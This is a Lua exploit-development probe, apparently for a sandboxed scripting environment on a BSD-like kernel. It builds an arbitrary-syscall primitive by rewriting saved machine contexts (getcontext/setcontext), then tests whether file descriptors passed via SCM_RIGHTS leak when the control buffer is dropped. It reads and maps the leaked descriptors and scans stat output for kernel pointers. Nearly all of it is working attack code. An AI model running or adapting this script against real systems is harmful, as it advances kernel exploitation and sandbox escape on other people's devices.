-- CRASH_CLASS: LOW
-- PROBE 151d: Verify fd leak from controllen=0 SCM_RIGHTS drops
--
-- 151c showed: after 10 rounds of send+drop(controllen=0), next fd=34
-- Expected 24 (= socket pair 22,23 + next). 34-24=10 leaked fds!
-- The kernel allocates an fd for SCM_RIGHTS but doesn't clean it up
-- when the cmsg is dropped due to insufficient controllen.
--
-- This probe:
-- 1. Establish baseline fd number
-- 2. Run controlled leak rounds
-- 3. Access the leaked fds (fstat, fcntl, read/write)
-- 4. Check if they point to valid file objects
-- 5. Test if we can close them

print("=== PROBE 151d: FD LEAK ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Step 1: Create socketpair and establish baseline
local sv = gpu + 0x1000
wq(sv, uint64(0))
local sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
local s0 = to_num(memory.read_dword(sv))
local s1 = to_num(memory.read_dword(sv + 4))
print("sockets=" .. s0 .. "," .. s1)

-- Get baseline fd by opening and closing a pipe
local base_r = srop(42)
local base_fd = base_r and to_num(base_r) or -1
print("baseline_fd=" .. base_fd)
srop(6, uint64(base_fd))
srop(6, uint64(base_fd + 1))
-- After closing, baseline_fd should be the next available
print("next_should_be=" .. base_fd)

-- Step 2: Run exactly 5 leak rounds with known shm fds
-- Use shm objects instead of pipes so we know they're unique
local leaked = {}
for i = 1, 5 do
    -- Create shm object
    local nm = gpu + 0x2000 + i * 0x20
    wd(nm, 0x6B6C2F)
    wd(nm + 4, 0x00000030 + i)
    local shm_fd = srop(482, ga(0x2000 + i * 0x20), uint64(0x0202), uint64(0x1B6))
    local sv2 = shm_fd and to_num(shm_fd) or -1

    if sv2 >= 0 then
        -- Truncate to 1 page
        srop(480, uint64(sv2), uint64(0x4000))

        -- Map and write unique pattern
        local mp = srop(477, uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(sv2), uint64(0))
        local mph, mpl = get_hi_lo(mp)
        if mph ~= 0xFFFFFFFF then
            pcall(function() memory.write_dword(mp, 0xFACE0000 + i) end)
            srop(73, mp, uint64(0x4000))
        end

        -- Send this shm fd via SCM_RIGHTS
        local mh = gpu + 0x3000
        local iv = gpu + 0x3100
        local cm = gpu + 0x3200
        local io = gpu + 0x3300

        wd(io, 0x50 + i)
        wq(iv, ga(0x3300))
        wq(iv + 8, uint64(1))
        for off = 0, 31, 4 do wd(cm + off, 0) end
        wd(cm, 20)
        wd(cm + 4, 0xFFFF)
        wd(cm + 8, 1)
        wd(cm + 16, sv2)

        wq(mh, uint64(0))
        wd(mh + 8, 0)
        wq(mh + 0x10, ga(0x3100))
        wd(mh + 0x18, 1)
        wq(mh + 0x20, ga(0x3200))
        wd(mh + 0x28, 24)
        wd(mh + 0x30, 0)

        srop(28, uint64(s0), ga(0x3000), uint64(0))

        -- Close our shm fd
        srop(6, uint64(sv2))

        -- Receive with controllen=0 (drop the cmsg)
        local rmh = gpu + 0x4000
        wq(gpu + 0x4300, uint64(0))
        wq(gpu + 0x4100, ga(0x4300))
        wq(gpu + 0x4100 + 8, uint64(64))

        wq(rmh, uint64(0))
        wd(rmh + 8, 0)
        wq(rmh + 0x10, ga(0x4100))
        wd(rmh + 0x18, 1)
        wq(rmh + 0x20, ga(0x4200))
        wd(rmh + 0x28, 0)
        wd(rmh + 0x30, 0)

        srop(27, uint64(s1), ga(0x4000), uint64(0))

        leaked[i] = base_fd + i - 1
    end
end

-- Step 3: Check what fd we get next
local check_r = srop(42)
local check_fd = check_r and to_num(check_r) or -1
print("after_5_drops_fd=" .. check_fd)
print("expected_if_leak=" .. (base_fd + 5))
print("expected_if_clean=" .. base_fd)
srop(6, uint64(check_fd))
srop(6, uint64(check_fd + 1))

if check_fd == base_fd + 5 then
    print("*** FD LEAK CONFIRMED ***")
elseif check_fd == base_fd then
    print("no leak (clean)")
else
    print("unexpected fd=" .. check_fd)
end

-- Step 4: Try to access the presumed leaked fds
print("")
print("--- LEAKED FD ACCESS ---")
for i = 1, 5 do
    local lfd = base_fd + i - 1
    print("")
    print("fd=" .. lfd .. ":")

    -- fcntl(F_GETFL=3)
    local fl = srop(92, uint64(lfd), uint64(3))
    local flv = fl and to_num(fl) or -1
    print("  getfl=" .. flv)

    -- fcntl(F_GETFD=1) — get close-on-exec
    local fd_flags = srop(92, uint64(lfd), uint64(1))
    local ffv = fd_flags and to_num(fd_flags) or -1
    print("  getfd=" .. ffv)

    -- fstat via syscall 551
    local sbuf = gpu + 0x5000
    for off = 0, 0x7F, 4 do wd(sbuf + off, 0) end
    local fs = srop(551, uint64(lfd), ga(0x5000))
    local fsv = fs and to_num(fs) or -1
    print("  fstat=" .. fsv)

    if fsv == 0 then
        -- st_dev at +0
        local dev = to_num(memory.read_dword(sbuf))
        -- st_ino at +4 (or +8 on 64-bit)
        local ino = to_num(memory.read_dword(sbuf + 8))
        -- st_mode at +8 (or +4)
        local mode = to_num(memory.read_dword(sbuf + 4))
        print("  dev=0x" .. string.format("%08X", dev) .. " ino=" .. ino .. " mode=0x" .. string.format("%08X", mode))

        -- Scan for kernel pointers
        for off = 0, 0x78, 8 do
            local ok2, v = pcall(function() return memory.read_qword(sbuf + off) end)
            if ok2 then
                local h, l = get_hi_lo(v)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print("  *** KPTR stat+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
                end
            end
        end
    end

    -- Try to mmap the leaked fd (if it's an shm fd, this should work)
    local mp = srop(477, uint64(0), uint64(0x4000), uint64(1), uint64(1), uint64(lfd), uint64(0))
    local mph, mpl = get_hi_lo(mp)
    if mph ~= 0xFFFFFFFF then
        local ok3, v3 = pcall(function() return memory.read_dword(mp) end)
        if ok3 then
            print("  *** MMAP OK: read=0x" .. string.format("%08X", to_num(v3)) .. " ***")
        end
        srop(73, mp, uint64(0x4000))
    else
        print("  mmap=-1")
    end

    -- Try close
    local cl = srop(6, uint64(lfd))
    local clv = cl and to_num(cl) or -1
    print("  close=" .. clv)
end

-- Step 5: After closing leaked fds, check next fd
local final_r = srop(42)
local final_fd = final_r and to_num(final_r) or -1
print("")
print("after_close_leaked=" .. final_fd)
srop(6, uint64(final_fd))
srop(6, uint64(final_fd + 1))

-- Cleanup: unlink shm objects
for i = 1, 5 do
    local nm = gpu + 0x2000 + i * 0x20
    srop(483, ga(0x2000 + i * 0x20))
end
srop(6, uint64(s0))
srop(6, uint64(s1))

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
